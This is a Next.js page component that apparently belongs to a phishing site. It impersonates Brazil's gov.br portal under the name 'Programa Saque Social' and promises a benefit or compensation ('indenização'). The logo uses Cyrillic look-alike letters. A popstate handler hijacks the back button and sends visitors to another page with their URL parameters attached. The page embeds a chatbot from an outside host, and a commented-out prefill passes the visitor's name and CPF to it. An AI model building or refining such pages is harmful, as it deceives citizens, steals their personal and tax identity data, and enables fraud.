
"use client";

import React, { useState, useEffect, Suspense, useRef } from 'react';
import Head from 'next/head';
import Image from 'next/image';
// Script tag from next/script is removed as we are using dynamic import
import { useSearchParams, useRouter } from 'next/navigation';
import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
import '../chat-page.css';

function ChatPageContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [headerUserName, setHeaderUserName] = useState('Usuário');
  const typebotInitializedRef = useRef(false);

  useEffect(() => {
    const urlBackRedirect = '/back/index.html';
    const currentQuery = searchParams.toString();
    const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + currentQuery;

    if (window.history.state?.pageInitialized !== true) {
        history.pushState({ pageInitialized: true }, "", window.location.href);
    }
    
    const handlePopState = () => {
      setTimeout(() => {
        window.location.href = trimmedUrlBackRedirect;
      }, 1);
    };
    window.addEventListener('popstate', handlePopState);

    const nomeParam = searchParams.get('nome');
    if (nomeParam) {
      setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
    }

    return () => {
      window.removeEventListener('popstate', handlePopState);
    };
  }, []); // Runs once on mount

  useEffect(() => {
    if (typebotInitializedRef.current) {
      console.log('Typebot initialization already attempted/completed.');
      return;
    }

    const typebotElement = document.querySelector('typebot-standard');
    if (!typebotElement) {
      console.error('Typebot standard element not found in DOM. Initialization aborted.');
      // It's possible the element isn't rendered yet, this effect might run too early
      // Or it's missing from JSX.
      return;
    }

    // Check if Typebot content is already there (e.g., if it self-initialized or from a previous attempt)
    if (typebotElement.shadowRoot?.querySelector('.typebot-container')) {
      console.log('Typebot appears to be already initialized in the DOM.');
      typebotInitializedRef.current = true;
      return;
    }
    
    console.log('Attempting to dynamically import @typebot.io/js...');
    import('@typebot.io/js')
      .then((TypebotModule) => {
        if (TypebotModule && TypebotModule.default && typeof TypebotModule.default.initStandard === 'function') {
          console.log('Successfully imported @typebot.io/js. Initializing Typebot...');
          try {
            TypebotModule.default.initStandard({
              typebot: "24lkdef", 
              apiHost: "https://chat.bestbot.info",
              // You can add prefill options here if needed, e.g.:
              // prefill: {
              //   nome: searchParams.get('nome') || '',
              //   cpf: searchParams.get('cpf') || '',
              // }
            });
            typebotInitializedRef.current = true; // Mark as initialized
            console.log('Typebot.initStandard called successfully using imported module.');
          } catch (e) {
            console.error('Error during Typebot.initStandard call (imported module):', e);
          }
        } else {
          console.error('Failed to import Typebot correctly or initStandard not found on the imported module.');
        }
      })
      .catch(err => {
        console.error('Error dynamically importing @typebot.io/js:', err);
      });
  }, []); // Empty dependency array ensures this runs once on mount


  return (
    <>
      <Head>
        <title>Programa Saque Social - Atendimento</title>
        {/* Removed modulepreload link for CDN, as we are using npm package */}
      </Head>
      
      {/* Removed next/script tag for local /js/typebot-web.js */}

      <div className="chat-page-body">
        <header className="chat-page-header">
          <div className="logo">
            <svg width="148" height="45" viewBox="0 0 148 45" aria-label="GОV.ВR">
              <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif">
                <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan>
                <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
              </text>
            </svg>
          </div>
          <div className="icons">
            <button title="Opções"><MoreVertical /></button>
            <button title="Cookies"><Cookie /></button>
            <button title="Menu de Apps"><LayoutGrid /></button>
            <button className="user">
              <User />
              <span>{headerUserName}</span>
            </button>
          </div>
        </header>

        <nav className="chat-page-nav">
          <button>
            <Menu />
            <p>Benefício <span> &gt; </span> Indenização <span> &gt; </span> Atendimento</p>
          </button>
          <button title="Buscar"><Search /></button>
        </nav>

        <div className="typebot-container-wrapper">
            <div className="typebot-embed-container">
                 <typebot-standard style={{ width: '100%', height: '100%' }}></typebot-standard>
            </div>
        </div>
        
        <footer className="chat-page-footer">
          <Image 
            src="https://i.imgur.com/919uhHG.png"
            alt="Rodapé Logo" 
            width={150} 
            height={40} 
            className="footer-logo"
            data-ai-hint="company logo"
            priority={false}
          />
        </footer>
      </div>
    </>
  );
}

export default function ChatPage() {
  return (
    <Suspense fallback={
      <div id="loading-screen" style={{display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100vw', height: '100vh', background: '#fff'}}> 
        <svg className="blink-logo" width="148" height="45" viewBox="0 0 148 45"> 
          <title>GОV.ВR</title> 
          <text x="0" y="33" fontSize="40" fontWeight="900" fontFamily="Arial, sans-serif"> 
            <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan> 
            <tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan> 
          </text> 
        </svg> 
      </div>
    }>
      <ChatPageContent />
    </Suspense>
  );
}
